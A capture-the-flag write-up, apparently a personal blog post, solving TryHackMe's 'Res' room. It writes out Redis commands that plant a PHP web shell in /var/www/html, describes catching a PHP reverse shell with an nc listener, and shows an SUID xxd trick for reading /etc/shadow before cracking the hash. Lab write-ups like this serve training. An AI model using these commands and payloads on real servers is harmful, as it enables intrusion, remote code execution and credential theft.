# **Description**

Hello hackers, I hope you are doing well. We are doing [Res](https://tryhackme.com/room/res) from [TryHackMe](https://tryhackme.com). We find a misconfigured databases that we exploit to get rce on the target and then a reverse shell. Then we find a binary with suid bit giving us the ability to read any file we want which leads to getting a root shell.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.184.71
Host is up (0.085s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

We found port 80 open running Apache web server. Let's scan all port this time : `sudo nmap -p- --min-rate 5000 -sV -T4 {Target_ip}`

```terminal
Nmap scan report for 10.10.184.71
Host is up (0.080s latency).
Not shown: 65404 closed tcp ports (reset), 129 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
```

We found another port running `redis` version 6.0.7

## Redis

We can connect to `redis` using the following command: `redis -h {Target_ip}`

```terminal
$ redis-cli -h 10.10.184.71
10.10.184.71:6379>
```

We can run the command `info` which will give up statistics about the redis server.

```terminal
10.10.184.71:6379> info

# Keyspace
10.10.184.71:6379>
```

The section that can be useful for us is **Keyspace** which provides us with the databases and the keys available on the server. Unfortunately, we couldn't find anything in this server.

We can see that the redis server is located in the home directory of a user named `vianka`, but it's not very useful for us.

Searching on the internet for ways to get RCE using redis i found the following [article](http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html) that describes how to get a php webshell with the following example.

```terminal
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```

We need to make some changes in the commands above.

We know that the web server running on the target is Apache, so we need to change the directory to **/var/www/html**.

We can leave the dbfilename as it is.

We change the php code to the following one that would give us remote code execution on the target.

```php
<?php system($_GET['cmd']); ?>
```

Let's do it.

```terminal
10.10.184.71:6379> config set dir /var/www/html
OK
10.10.184.71:6379> config set dbfilename redis.php
OK
10.10.184.71:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.184.71:6379> save
OK
10.10.184.71:6379> 
```

Now if we can go to `http://{target_ip/redis.php?cmd=}` to execute commands.

![](1.png)

We have code execution now.

# **Foothold**

To get a reverse shell, i uploaded [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)'s php code to the target.

>Don't forget to change the ip address in the code to your tun0 ip.

![](2.png)

Now we setup a listener with `nc -lvnp 1234` and request the shell.php file.

![](3.png)

We're in.

# **Privilege Escalation**

I uploaded `linpeas` to the target and run it.

![](4.png)

We find that `xxd` has suid bit, let's check [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/#suid).

![](5.png)


We can run the following command to read any file in the system.

```bash
xxd {filename} | xxd -r
```

To read the shadow file for example, run `xxd /etc/shadow | xxd -r`

![](6.png)

We have vianka's hash, we can crack it using `john`.

![](7.png)

We can now change user to `vianka` and then to root.
